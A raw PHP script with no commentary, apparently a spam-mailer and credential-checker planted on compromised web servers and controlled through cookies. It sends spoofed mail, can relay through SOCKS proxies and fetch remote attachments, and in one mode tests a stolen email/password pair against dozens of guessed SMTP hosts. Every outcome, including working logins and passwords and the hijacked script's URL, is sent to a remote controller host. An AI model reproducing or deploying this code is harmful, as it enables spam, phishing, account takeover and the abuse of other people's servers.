<?error_reporting(0);$host=urldecode($_COOKIE['ho']);$port=$_COOKIE['po'];$socks_host=$_COOKIE['sh'];$socks_port=$_COOKIE['sp'];$mail=urldecode($_COOKIE['ma']);$login=urldecode($_COOKIE['lo']);
$pass=urldecode($_COOKIE['pa']);$mailto=urldecode($_COOKIE['mt']);$fname=urldecode($_COOKIE['fn']);$organ=urldecode($_COOKIE['or']);$ehlo=urldecode($_COOKIE['eh']);$subj=urldecode($_COOKIE['su']);$sub=$subj;
$body=stripslashes(urldecode($_COOKIE['bo']));$sds=urldecode($_COOKIE['sd']);$tout=$_COOKIE['rt'];$socks_user=urldecode($_COOKIE['sl']);$socks_pass=urldecode($_COOKIE['sc']);$rel=$mail.':'.$pass;
if(!$_COOKIE['a']){if($socks_host){$socks=$socks_host.':'.$socks_port;}$body=str_replace("{br}", "\n", $body);$ex = explode("@", $mail);$pd = $ex[1];
if($_COOKIE['cm']){$fname="=?".$_COOKIE['ch']."?Q?".str_replace("+","_",str_replace("%","=",urlencode($fname)))."?=";
$sub="=?".$_COOKIE['ch']."?Q?".str_replace("+","_",str_replace("%","=",urlencode($subj)))."?=";}

if (substr($_SERVER['SERVER_NAME'], 0, 4) == 'www.'){$_SERVER['SERVER_NAME']=substr($_SERVER['SERVER_NAME'], 4);}
$header="Date: ".date("D, j M Y G:i:s O")."\r\n";
$header.='From: "'.$fname.'" <'.$organ."@".$_SERVER['SERVER_NAME'].">\r\n";
$header.="Message-ID: <".rand(100000000,9999999999).".".date("YmdHis")."@".$pd.">\r\nTo: ".$mailto."\r\nMIME-Version: 1.0\r\n";

if($_COOKIE['ht']=='1'){$body='<html><head><title>'.$subj.'</title>
<META http-equiv=Content-Type content="text/html; charset='.$_COOKIE['ch'].'">
</head>
<body>'.$body.'</body>';}

if($_COOKIE['at']){$att=$_COOKIE['at'];$atte = explode("^", urldecode($att));
$afph=explode("/", $atte[0]);$affdom=explode(":", $afph[2]);if(!$affdom[1]){$affdom[1]='80';}$afp=fsockopen($affdom[0],$affdom[1],$errno,$errstr,$tout);
if (!$afp) {post_stats('A1');exit;}fwrite($afp, "GET ".$atte[0]." HTTP/1.0\r\nHost: ".$affdom[0]."\r\nConnection: Close\r\n\r\n");
while(!feof($afp)){$str=fgets($afp,128);$ch.=$str;if($str=="\r\n"&&empty($he)){$he = 'do';}if($he=='do'){$att_cont.=$str;}}fclose($afp);
$att_cont=substr($att_cont, 2);$ch=explode(" ", $ch);if($ch[1]!='200'){post_stats('A2');exit;}if(!$att_cont){post_stats('A3');exit;}

$bound='----------'.strtoupper(dechex(rand(10000000,99999999)).dechex(rand(10000000,99999999)).dechex(rand(10,9999)));$attext=explode(".", $atte[1]);
$attct='application/octet-stream';if($attext[1]=='gif'){$attct='image/gif';}if($attext[1]=='jpg'){$attct='image/jpeg';}if($attext[1]=='jpeg'){$attct='image/jpeg';}
if($attext[1]=='htm'){$attct='text/html';}if($attext[1]=='html'){$attct='text/html';}
 $header.="Content-Type: multipart/mixed;\r\n".' boundary="'.$bound.'"'."\r\n \r\n".'--'.$bound."\r\n";

 $body.="\r\n--".$bound."\r\nContent-Type: ".$attct.";\r\n name=".'"'.$atte[1].'"'."\r\nContent-transfer-encoding: base64\r\nContent-Disposition: attachment;\r\n filename=".'"'.$atte[1].'"'."\r\n\r\n";
$body.=chunk_split(base64_encode($att_cont),76,"\r\n")."--".$bound."--\r\n";}
if($_COOKIE['ht']=='1'){$header.="Content-Type: text/html;";}else{$header.="Content-Type: text/plain;";}
$header.=" charset=".$_COOKIE['ch']."\r\nContent-Transfer-Encoding: 8bit\r\n";

if(mail($mailto, $subj, $body, $header)){
post_stats('OK');
}else{
post_stats('P1');
}
die();


if(empty($socks_host)){$fp = fsockopen($host,$port,$errno, $errstr, $tout);}else{$fp = fsockopen($socks_host,$socks_port,$errno,$errstr,$tout);
$h=pack("H*",'05020002');fwrite($fp,$h);$result=bin2hex(fread($fp,4));if($result == '0500'){$auth="socks5";}elseif($result == '0502'){$len_login = chr(strlen($socks_user));
$len_pass  = chr(strlen($socks_pass));$h=pack("H*","01").$len_login.$socks_user.$len_pass.$socks_pass;
fwrite($fp,$h);$result=bin2hex(fread($fp,4));if($result{3}!=0){$socks_stat='S1';fclose($fp);}else{$auth="socks5";}}else{fclose($fp);$fp = fsockopen($socks_host,$socks_port,$errno,$errstr,$tout);   
$query  = pack("C2", 0x04, 0x01).pack("n", $port)._host2int($host)."0".pack("C", 0);fwrite($fp,$query);$l=bin2hex(fread($fp,1024));$status = substr($l, 2, 2); 
IF ($status=="5a"){$auth="socks4";}ELSEIF ($status=="5b"){$socks_stat='S41';}ELSEIF ($status=="5c"){$socks_stat='S42';
}ELSEIF ($status=="5a"){$socks_stat='S43';}}$list="";if($auth=="socks5"){$len_h=chr(strlen($host));$h=pack("H*","05010003").$len_h.$host.pack("n",$port);
fwrite($fp,$h);$result=bin2hex(fread($fp,100));if($result{3} == 0){$socks_stat='OK';}elseif($result{3}==1){$socks_stat='S51';}elseif($result{3}==2){$socks_stat='S52';}
elseif($result{3}==3){$socks_stat='S53';}elseif($result{3}==4){$socks_stat='S54';}elseif($result{3}==5){$socks_stat='S55';}elseif($result{3}==6){$socks_stat='S56';}
elseif($result{3}==7){$socks_stat='S57';}elseif($result{3}==8){$socks_stat='S58';}else{$socks_stat='S59';}}elseif($auth=="socks4"){$socks_stat='OK';}else{$socks_stat='S2';}
if($socks_stat=='OK'){}else{post_stats($socks_stat); fclose($fp); exit;}}

if(!$fp) {post_stats('E1'); fclose($fp); exit;}$data = get_data($fp);fputs($fp,"EHLO ".$ehlo."\r\n");$code = substr(get_data($fp),0,3);
if($code!=250){post_stats('E2'); fclose($fp); exit;}fputs($fp,"AUTH LOGIN\r\n");$code = substr(get_data($fp),0,3);
if($code!=334){post_stats('E3'); fclose($fp); exit;}fputs($fp,base64_encode($login)."\r\n");$code = substr(get_data($fp),0,3);
if($code!=334){post_stats('E4'); fclose($fp); exit;}fputs($fp,base64_encode($pass)."\r\n");$code = substr(get_data($fp),0,3);
if($code!=235){post_stats('E5'); fclose($fp); exit;}$size_msg=strlen($header."\r\n".$body);fputs($fp,"MAIL FROM:<".$mail."> SIZE=".$size_msg."\r\n");$code = substr(get_data($fp),0,3);
if($code!=250){post_stats('E6'); fclose($fp); exit;}fputs($fp,"RCPT TO:<".$mailto.">\r\n");$code = substr(get_data($fp),0,3);
if($code!=250 AND $code!=251){post_stats('E7'); fclose($fp);exit;}fputs($fp,"DATA\r\n");$code = substr(get_data($fp),0,3);
if($code!=354){post_stats('E8'); fclose($fp); exit;}fputs($fp,$header."\r\n".$body."\r\n.\r\n");$code = substr(get_data($fp),0,3);
if($code!=250){post_stats('E9'); fclose($fp); exit;}fputs($fp,"QUIT\r\n");fclose($fp);post_stats('OK');}

if($_COOKIE['a']=='c'){IF($host AND $port AND $login){mch($host,$port,$login,$pass);post_mch($sds,'C3',$rel);}$fm = $mail;$mh = explode("@", $fm);$em = $mh[0];$host = $mh[1];
$ping = fsockopen($host,80,$errno,$errstr,$tout);if(!$ping){post_mch($sds,'C1',$rel);}fclose($ping);$smtp=smtp_lookup($host);$lport=25;$try=mch($smtp,$lport,$em,$pass);
if($try=='BHOST'){$smtp='ssl://'.$smtp;$lport=465;$try=mch($smtp,$lport,$em,$pass);}if($try=='BAUTH'){$try=mch($smtp,$lport,$fm,$pass);}
mch('smtp.'.$host,25,$em,$pass);mch('smtp.'.$host,25,$fm,$pass);mch('mail.'.$host,25,$em,$pass);mch('mail.'.$host,25,$fm,$pass);mch('mx.'.$host,25,$em,$pass);mch('mx.'.$host,25,$fm,$pass);
mch($host,25,$em,$pass);mch('relay.'.$host,25,$em,$pass);mch('email.'.$host,25,$em,$pass);mch('pop.'.$host,25,$em,$pass);mch('pop3.'.$host,25,$em,$pass);mch('imap.'.$host,25,$em,$pass);
mch('freemail.'.$host,25,$em,$pass);mch('box.'.$host,25,$em,$pass);mch('smtp.mail.'.$host,25,$em,$pass);mch($host,25,$fm,$pass);mch('relay.'.$host,25,$fm,$pass);mch('email.'.$host,25,$fm,$pass);
mch('pop.'.$host,25,$fm,$pass);mch('pop3.'.$host,25,$fm,$pass);mch('imap.'.$host,25,$fm,$pass);mch('freemail.'.$host,25,$fm,$pass);mch('box.'.$host,25,$fm,$pass);mch('smtp.mail.'.$host,25,$fm,$pass);
mch('ssl://smtp.'.$host,465,$em,$pass);mch('ssl://mail.'.$host,465,$em,$pass);mch('ssl://smtp.'.$host,465,$fm,$pass);mch('ssl://mail.'.$host,465,$fm,$pass);mch('ssl://mx.'.$host,465,$em,$pass);mch('ssl://mx.'.$host,465,$fm,$pass);
mch('ssl://'.$host,465,$em,$pass);mch('ssl://relay.'.$host,465,$em,$pass);mch('ssl://email.'.$host,465,$em,$pass);mch('ssl://pop.'.$host,465,$em,$pass);mch('ssl://pop3.'.$host,465,$em,$pass);mch('ssl://imap.'.$host,465,$em,$pass);
mch('ssl://freemail.'.$host,465,$em,$pass);mch('ssl://box.'.$host,465,$em,$pass);mch('ssl://smtp.mail.'.$host,465,$em,$pass);mch('ssl://'.$host,465,$fm,$pass);mch('ssl://relay.'.$host,465,$fm,$pass);mch('ssl://email.'.$host,465,$fm,$pass);
mch('ssl://pop.'.$host,465,$fm,$pass);mch('ssl://pop3.'.$host,465,$fm,$pass);mch('ssl://imap.'.$host,465,$fm,$pass);mch('ssl://freemail.'.$host,465,$fm,$pass);mch('ssl://box.'.$host,465,$fm,$pass);mch('ssl://smtp.mail.'.$host,465,$fm,$pass);post_mch($sds,'C2',$rel);}

function post_stats($stat){global $tout, $sds, $rel, $socks, $mailto, $att;$shl=urlencode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);
$rel=urlencode($rel);$mailto=urlencode($mailto);$host=explode("/", $sds);$hp=explode(":", $host[0]);if(empty($hp[1])){$hp[1]='80';}
$data='st='.$stat.';rl='.$rel.';mt='.$mailto.';sh='.$shl.';so=U9;sk='.$socks.';at='.$att;
$socket = socket_create(AF_INET,SOCK_STREAM,0);socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array("sec" => $tout, "usec" => 0));
if (!socket_connect($socket, $hp[0], $hp[1])){socket_close($socket);}else{socket_write($socket, "GET http://".$sds."/post.php HTTP/1.1\r\nHost: ".$host[0]."\r\nCookie: ".$data."\r\n\r\n");socket_close($socket);}}

function _host2int($host){$ip = gethostbyname($host);if(preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/", $ip, $matches)){$retVal = pack("C4", $matches[1], $matches[2], $matches[3], $matches[4]);}return $retVal;}
function mch($host,$port,$mail,$pass){global $tout,$rel,$ehlo,$sds;$smtp_conn = fsockopen($host,$port,$errno,$errstr,$tout);if(!$smtp_conn) {fclose($smtp_conn);return ("BHOST");}
$data = get_data($smtp_conn);fputs($smtp_conn,"EHLO ".$ehlo."\r\n");$code = substr(get_data($smtp_conn),0,3);if($code != 250) {fclose($smtp_conn);return("BAUTH");}
fputs($smtp_conn,"AUTH LOGIN\r\n");$code = substr(get_data($smtp_conn),0,3);if($code != 334) {fclose($smtp_conn); return ("BAUTH");}
fputs($smtp_conn,base64_encode($mail)."\r\n");$code = substr(get_data($smtp_conn),0,3);if($code != 334) {fclose($smtp_conn); return ("BAUTH");}
fputs($smtp_conn,base64_encode($pass)."\r\n");$code = substr(get_data($smtp_conn),0,3);if($code != 235) {fclose($smtp_conn); return ("BAUTH");}
fclose($smtp_conn);post_mch($sds,'OK',$rel.';||'.$host.'||'.$port.'||'.$mail.'||'.$pass);}
function smtp_lookup($host){if(function_exists("getmxrr")){getmxrr($host,$mxhosts,$mxweight);return $mxhosts[0];}else{win_COOKIEmxrr($host,$mxhosts,$mxweight);return $mxhosts[3];}}
function win_COOKIEmxrr($hostname, &$mxhosts, &$mxweight=false){if(strtoupper(substr(PHP_OS, 0, 3))!='WIN') return;if(!is_array($mxhosts)) $mxhosts=array();
if(empty($hostname)) return;$exec='nslookup -type=MX '.escapeshellarg($hostname);@exec($exec,$output);if(empty($output)) return;$i=-1;foreach($output as $line){$i++;
if(preg_match("/^$hostname\tMX preference = ([0-9]+), mail exchanger = (.+)$/i",$line,$parts)){$mxweight[$i]=trim($parts[1]);$mxhosts[$i]=trim($parts[2]);}
if(preg_match('/responsible mail addr = (.+)$/i',$line,$parts)){$mxweight[$i]=$i;$mxhosts[$i]=trim($parts[1]);}}return($i!=-1);}
function get_data($fp){$data="";while($str=fgets($fp,515)){$data.=$str;if(substr($str,3,1)==" "){break;}}return $data;}

function post_mch($sds,$stat,$rel){global $tout;$shl=urlencode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);$rel=urlencode($rel);
$host=explode("/", $sds);$hp=explode(":", $host[0]);if(empty($hp[1])){$hp[1]='80';}$data='st='.$stat.';rl='.$rel.';sh='.$shl.';so=C2';
$socket = socket_create(AF_INET,SOCK_STREAM,0);socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array("sec" => $tout, "usec" => 0));
if (!socket_connect($socket, $hp[0], $hp[1])){socket_close($socket);}else{
socket_write($socket, "GET http://".$sds."/cpost.php HTTP/1.1\r\nHost: ".$host[0]."\r\nCookie: ".$data."\r\n\r\n");socket_close($socket);}die();}
?>